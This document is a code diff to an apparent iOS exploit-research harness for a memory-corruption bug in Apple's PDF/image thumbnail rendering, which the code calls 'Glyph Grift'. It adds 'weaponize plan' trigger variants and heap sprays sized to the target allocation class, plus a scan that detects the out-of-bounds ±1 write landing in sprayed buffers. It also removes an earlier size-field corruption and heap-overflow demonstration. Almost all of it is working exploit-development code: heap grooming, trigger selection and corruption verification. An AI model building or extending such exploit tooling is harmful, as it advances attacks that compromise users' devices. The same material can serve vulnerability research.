@@ -807,12 +807,12 @@ static int kpncRemoveFlow(int fd, const uint8_t *flow) {
         if (gGlyphIdx < 0) gGlyphIdx = 0;
     }
     // Extended set: g1-g8 (legacy) + W-variants (weaponize plan §3).
-    // Cursor index 0-7 = g1-g8 unchanged; 8-10 = W-set.
-    const char *names[11] = {
+    // Cursor index 0-7 = g1-g8 unchanged; 8-13 = W-set (incl. past-slack + stack).
+    const char *names[14] = {
         "g1", "g2", "g3", "g4", "g5", "g6", "g7", "g8",
-        "w1a", "w1a_neg", "w4b"
+        "w1a", "w1a_neg", "w4b", "w1b", "w1c", "w3a"
     };
-    const char *desc[11] = {
+    const char *desc[14] = {
         "tx32000 dx31 n9  STACK 992   (known crash, alloca)",
         "tx32000 dx32 n9  HEAP  1024  (threshold)",
         "tx32000 dx33 n9  HEAP  1056  (THE original crash)",
@@ -821,11 +821,14 @@ static int kpncRemoveFlow(int fd, const uint8_t *flow) {
         "tx32000 dx40 n9  HEAP  1280",
         "tx32000 dx33 n10 HEAP  2111  (double dev_x)",
         "tx32000 dx33 n8  STACK 528   (half dev_x)",
-        "W1a     tx32842 dx32 n9  YS1 tm.99999868 HEAP 4156 off+4156  next+0",
-        "W1a_neg tx32842 dx32 n9  YS1 neg          HEAP 4156 off+4156  sign-flip",
-        "W4b     tx16454 dx32 n10 YS1 tm1.0        HEAP 8252 off+8316  next+64",
+        "W1a     tx32842 dx32 n9  HEAP 4156 off+4156 (slack!)",
+        "W1a_neg tx32842 dx32 n9  HEAP 4156 sign-flip",
+        "W4b     tx16454 dx32 n10 HEAP 8252 off+8316 (slack!)",
+        "W1b     tx32858 dx32 n9  HEAP 4156 off~5180 PAST good_size",
+        "W1c     tx32874 dx32 n9  HEAP 4156 off~6204 well past",
+        "W3a     tx32840 dx31 n9  STACK 4028 just past alloca",
     };
-    int idx = gGlyphIdx % 11;
+    int idx = gGlyphIdx % 14;
     {
         NSString *next = [NSString stringWithFormat:@"%d", gGlyphIdx + 1];
         [next writeToFile:idxPath atomically:YES encoding:NSUTF8StringEncoding error:nil];
@@ -901,8 +904,10 @@ static int kpncRemoveFlow(int fd, const uint8_t *flow) {
 // Variant spray size class (bytes). 0x1000 = legacy.
 static size_t kpGlyphSpraySize(const char *vname) {
     if (!vname) return 0x1000;
-    if (!strcmp(vname, "w1a") || !strcmp(vname, "w1a_neg")) return 4156;
+    if (!strcmp(vname, "w1a") || !strcmp(vname, "w1a_neg") ||
+        !strcmp(vname, "w1b") || !strcmp(vname, "w1c")) return 4156;
     if (!strcmp(vname, "w4b")) return 8252;
+    if (!strcmp(vname, "w3a")) return 4028;
     return 0x1000;
 }
 
@@ -912,11 +917,11 @@ static size_t kpGlyphSpraySize(const char *vname) {
 
     // ---- 1. pick variant (disk cursor, or forced name) ----
     NSString *idxPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents/kexproof-r5h-idx.txt"];
-    const char *names[11] = {
+    const char *names[14] = {
         "g1","g2","g3","g4","g5","g6","g7","g8",
-        "w1a","w1a_neg","w4b"
+        "w1a","w1a_neg","w4b","w1b","w1c","w3a"
     };
-    const char *desc[11] = {
+    const char *desc[14] = {
         "tx32000 dx31 n9  STACK 992",
         "tx32000 dx32 n9  HEAP  1024",
         "tx32000 dx33 n9  HEAP  1056",
@@ -925,18 +930,21 @@ static size_t kpGlyphSpraySize(const char *vname) {
         "tx32000 dx40 n9  HEAP  1280",
         "tx32000 dx33 n10 HEAP  2111",
         "tx32000 dx33 n8  STACK 528",
-        "W1a     tx32842 dx32 n9  YS1 HEAP 4156 off+4156 next+0",
+        "W1a     tx32842 dx32 n9  YS1 HEAP 4156 off+4156 (slack!)",
         "W1a_neg tx32842 dx32 n9  YS1 HEAP 4156 sign-flip",
-        "W4b     tx16454 dx32 n10 YS1 HEAP 8252 off+8316 next+64",
+        "W4b     tx16454 dx32 n10 YS1 HEAP 8252 off+8316 (slack!)",
+        "W1b     tx32858 dx32 n9  YS1 HEAP 4156 off~5180 PAST good_size",
+        "W1c     tx32874 dx32 n9  YS1 HEAP 4156 off~6204 well past",
+        "W3a     tx32840 dx31 n9  YS1 STACK 4028 just past alloca",
     };
     int idx = 0;
     if (forceName.length) {
-        for (int i = 0; i < 11; i++) {
+        for (int i = 0; i < 14; i++) {
             if ([forceName isEqualToString:@(names[i])]) { idx = i; break; }
         }
     } else {
         NSString *s = [NSString stringWithContentsOfFile:idxPath encoding:NSUTF8StringEncoding error:nil];
-        idx = s.intValue % 11; if (idx < 0) idx = 0;
+        idx = s.intValue % 14; if (idx < 0) idx = 0;
         [[NSString stringWithFormat:@"%d", s.intValue + 1] writeToFile:idxPath atomically:YES encoding:NSUTF8StringEncoding error:nil];
     }
     const char *vname = names[idx];
@@ -1076,42 +1084,37 @@ cleanup:
 //   +0x0C: u32 capacity= 0x00002000
 //   +0x10: u8  data…   = 0x42
 //   +spraySz-8: u64 index tag (trailer, excluded from scan)
-//
-// After glyph: scan +8 for size != 0x100.
-// If size grew past 0x100 → controlled heap overflow demo:
-//   malloc(0x100) dest, memcpy(dest, buf+0x10, corrupted_size)
-//   → writes past dest, proves OOB write via corrupted length.
+// ---------------------------------------------------------------------------
+// u16 ±1 typed spray — Glyph Grift is a ±1 u16 INCREMENT on two adjacent u16s.
+// Fill with 0x42 → every u16 = 0x4242. After glyph, scan for u16 != 0x4242.
+// ±1 signature: 0x4243 (+1) or 0x4241 (-1). Report offset/old/new/delta.
 // ---------------------------------------------------------------------------
 + (NSString *)glyphTypedSprayReport:(NSString *)forceName {
     NSMutableString *r = [NSMutableString string];
-    [r appendString:@"\n=== R5k: Glyph + TYPED spray (size-field weaponization) ===\n"];
+    [r appendString:@"\n=== R5k: Glyph u16 ±1 typed spray ===\n"];
 
-    // pick variant — default w1a (4156, best hit rate)
-    NSString *vname = forceName.length ? forceName : @"w1a";
+    NSString *vname = forceName.length ? forceName : @"w1b";
     size_t spraySz = kpGlyphSpraySize(vname.UTF8String);
-    scopeNote(r, [NSString stringWithFormat:@"  VARIANT %s typed spray=%zu", vname.UTF8String, spraySz]);
+    scopeNote(r, [NSString stringWithFormat:@"  VARIANT %s spray=%zu", vname.UTF8String, spraySz]);
 
-    NSString *logPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents/kexproof-r5k-typed.txt"];
-    NSString *line = [NSString stringWithFormat:@"TYPED SPRAY %s spray=%zu\n", vname.UTF8String, spraySz];
+    NSString *logPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents/kexproof-r5k-u16.txt"];
+    NSString *line = [NSString stringWithFormat:@"U16 SPRAY %s spray=%zu\n", vname.UTF8String, spraySz];
     { NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:logPath];
       if (fh) { [fh seekToEndOfFile]; [fh writeData:[line dataUsingEncoding:NSUTF8StringEncoding]]; [fh closeFile]; }
       else { [line writeToFile:logPath atomically:NO encoding:NSUTF8StringEncoding error:nil]; } }
 
     enum { NBUFS = 4096 };
-    enum { TYPED_SIZE = 0x100 };       // initial size field
-    enum { TYPED_CAP  = 0x2000 };      // declared capacity
     void **bufs = calloc(NBUFS, sizeof(void *));
     if (!bufs) { scopeNote(r, @"calloc fail"); return r; }
     int got = 0, holes = 0;
 
+    // Fill every byte with 0x42 → u16 pattern 0x4242 everywhere.
+    // Trailer (last 8 bytes) = index, excluded from scan.
     for (int i = 0; i < NBUFS; i++) {
         void *b = malloc(spraySz);
         if (!b) break;
-        memset(b, 0x42, spraySz);                       // data fill
-        *(uint64_t *)b = 0x4141414141414141ULL;         // magic
-        *(uint32_t *)((uint8_t *)b + 8) = TYPED_SIZE;   // size (TARGET)
-        *(uint32_t *)((uint8_t *)b + 12) = TYPED_CAP;   // capacity
-        *(uint64_t *)((uint8_t *)b + spraySz - 8) = (uint64_t)i;  // trailer
+        memset(b, 0x42, spraySz);
+        *(uint64_t *)((uint8_t *)b + spraySz - 8) = (uint64_t)i;
         bufs[i] = b;
         got++;
     }
@@ -1119,11 +1122,8 @@ cleanup:
     int live = got - holes;
     size_t goodSz = malloc_good_size(spraySz);
     scopeNote(r, [NSString stringWithFormat:
-                  @"  sprayed %d typed bufs x %zu  [live=%d holes=%d]  good_size=%zu",
+                  @"  sprayed %d bufs x %zu (u16=0x4242)  [live=%d holes=%d]  good_size=%zu",
                   got, spraySz, live, holes, goodSz]);
-    scopeNote(r, [NSString stringWithFormat:
-                  @"  layout: +0=magic  +8=size(0x%x)  +12=cap(0x%x)  +16=data  trailer=%zu",
-                  TYPED_SIZE, TYPED_CAP, spraySz - 8]);
 
     // ---- render glyph ----
     NSString *path = [[NSBundle mainBundle] pathForResource:vname ofType:@"pdf"];
@@ -1139,7 +1139,7 @@ cleanup:
             const void *vals[] = { kCFBooleanTrue, szRef };
             CFDictionaryRef opts = CFDictionaryCreate(NULL, keys, vals, 2,
                 &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
-            scopeNote(r, @"  rendering glyph with typed spray live…");
+            scopeNote(r, @"  rendering glyph…");
             CGImageRef img = CGImageSourceCreateThumbnailAtIndex(src, 0, opts);
             scopeNote(r, [NSString stringWithFormat:@"  SURVIVED. img=%p", (void *)img]);
             if (img) CGImageRelease(img);
@@ -1147,71 +1147,49 @@ cleanup:
         }
     }
 
-    // ---- scan for size corruption at +8 ----
-    [r appendString:@"\n--- typed scan (size field @ +8) ---\n"];
-    int hits = 0;
-    uint32_t firstOld = 0, firstNew = 0;
+    // ---- scan for u16 != 0x4242 (±1 signature = Glyph Grift) ----
+    [r appendString:@"\n--- u16 ±1 scan ---\n"];
+    int hits = 0, hitsPlus = 0, hitsMinus = 0, hitsOther = 0;
     int firstIdx = -1;
-    int grew = 0, shrank = 0;
+    size_t firstOff = 0;
+    uint16_t firstOld = 0x4242, firstNew = 0;
+    size_t scanLen = (spraySz > 8) ? spraySz - 8 : spraySz;
+
     for (int i = 0; i < got; i += 2) {
         uint8_t *b = bufs[i];
         if (!b) continue;
-        uint32_t sz = *(uint32_t *)(b + 8);
-        if (sz == TYPED_SIZE) continue;   // untouched
-        hits++;
-        if (firstIdx < 0) { firstIdx = i; firstOld = TYPED_SIZE; firstNew = sz; }
-        if (sz > TYPED_SIZE) grew++; else shrank++;
-        if (hits <= 8) {  // log first few
-            scopeNote(r, [NSString stringWithFormat:
-                @"  HIT buf %d  size: 0x%x -> 0x%x  (+%d)  cap=0x%x  magic=%016llx",
-                i, TYPED_SIZE, sz, (int)sz - (int)TYPED_SIZE,
-                *(uint32_t *)(b + 12),
-                (unsigned long long)*(uint64_t *)b]);
+        for (size_t o = 0; o + 1 < scanLen; o += 2) {
+            uint16_t val = *(uint16_t *)(b + o);
+            if (val == 0x4242) continue;
+            hits++;
+            int delta = (int)val - (int)0x4242;
+            if (delta == 1) hitsPlus++;
+            else if (delta == -1) hitsMinus++;
+            else hitsOther++;
+            if (firstIdx < 0) {
+                firstIdx = i; firstOff = o; firstOld = 0x4242; firstNew = val;
+            }
+            if (hits <= 12) {
+                scopeNote(r, [NSString stringWithFormat:
+                    @"  HIT buf %d off=%zu  u16: 0x4242->0x%04x  delta=%+d%s",
+                    i, o, val, delta,
+                    (delta == 1 || delta == -1) ? "  [±1 GLYPH!]" : ""]);
+            }
         }
     }
     scopeNote(r, [NSString stringWithFormat:
-        @"  VERIFY TYPED_HIT=%d HITS=%d GREW=%d SHRANK=%d FIRST_IDX=%d SIZE 0x%x->0x%x VARIANT=%s",
-        hits > 0, hits, grew, shrank, firstIdx, firstOld, firstNew, vname.UTF8String]);
+        @"  VERIFY U16_HIT=%d TOTAL=%d PLUS1=%d MINUS1=%d OTHER=%d FIRST=(buf %d off %zu) 0x%04x->0x%04x VARIANT=%s",
+        hits > 0, hits, hitsPlus, hitsMinus, hitsOther,
+        firstIdx, firstOff, firstOld, firstNew, vname.UTF8String]);
 
     if (hits == 0) {
-        scopeNote(r, @"  size field untouched — glyph did not land on +8 this run.");
+        scopeNote(r, @"  no u16 changed — OOB did not reach our spray this run.");
+        scopeNote(r, @"  (slack theory: off < good_size → write lands inside coverage chunk)");
     } else {
-        scopeNote(r, [NSString stringWithFormat:@"  >>> %d typed buffer(s) with corrupted size!", hits]);
-        // ---- weaponization demo: heap overflow via corrupted length ----
-        if (grew > 0 && firstIdx >= 0) {
-            uint8_t *src = bufs[firstIdx];
-            uint32_t evilSz = *(uint32_t *)(src + 8);
-            // real data region starts at +16; read evilSz bytes from there
-            // dest is only TYPED_SIZE — so evilSz > TYPED_SIZE = overflow
-            uint8_t *dest = malloc(TYPED_SIZE);
-            if (dest) {
-                memset(dest, 0xAA, TYPED_SIZE);
-                scopeNote(r, [NSString stringWithFormat:
-                    @"  OOB-DEMO: memcpy(dest=0x%x, src+16, evil=0x%x)  overflow=%d bytes",
-                    TYPED_SIZE, evilSz, (int)evilSz - TYPED_SIZE]);
-                // safe demo: copy only what's within the source buffer
-                size_t srcAvail = spraySz - 16;
-                size_t copyN = (evilSz < srcAvail) ? evilSz : srcAvail;
-                memcpy(dest, src + 16, copyN);
-                // check if dest beyond TYPED_SIZE was written
-                int overflowed = 0;
-                if (copyN > TYPED_SIZE) {
-                    overflowed = 1;
-                    scopeNote(r, [NSString stringWithFormat:
-                        @"  >>> HEAP OVERFLOW CONFIRMED: wrote %zu bytes into 0x%x dest (delta=%zu)",
-                        copyN, TYPED_SIZE, copyN - TYPED_SIZE]);
-                    scopeNote(r, [NSString stringWithFormat:
-                        @"  dest[0x%x..0x%x] sample: %02x %02x %02x %02x",
-                        TYPED_SIZE, TYPED_SIZE + 4,
-                        dest[TYPED_SIZE], dest[TYPED_SIZE+1],
-                        dest[TYPED_SIZE+2], dest[TYPED_SIZE+3]]);
-                } else {
-                    scopeNote(r, [NSString stringWithFormat:
-                        @"  copyN=%zu <= 0x%x — evil size still inside dest, no overflow yet", copyN, TYPED_SIZE]);
-                }
-                scopeNote(r, [NSString stringWithFormat:@"  OOB-DEMO overflowed=%d", overflowed]);
-                free(dest);
-            }
+        scopeNote(r, [NSString stringWithFormat:@"  >>> %d u16 hit(s): +%d / -%d / other %d",
+                      hits, hitsPlus, hitsMinus, hitsOther]);
+        if (hitsPlus + hitsMinus > 0) {
+            scopeNote(r, @"  >>> GLYPH GRIFT SIGNATURE CONFIRMED — ±1 u16 increment in spray!");
         }
     }
 
